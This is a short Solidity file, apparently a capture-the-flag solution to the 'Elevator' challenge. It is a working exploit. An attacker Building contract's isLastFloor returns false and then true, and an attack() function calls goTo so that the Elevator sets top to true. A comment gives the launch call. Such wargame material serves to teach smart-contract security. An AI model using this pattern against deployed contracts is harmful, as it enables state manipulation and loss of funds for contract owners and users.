pragma solidity ^0.4.18;


//interface Building {
//  function isLastFloor(uint) view public returns (bool);
//}

contract Building {
    bool a;
    function isLastFloor(uint _floor) view public returns (bool){
        if(!a) {
            a = true;
            return false;
        } else {
            return true;
        }
    }
    function attack(address _target){
        Elevator e = Elevator(_target);
        e.goTo(100);
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

// Call Building.attack("Contract Address")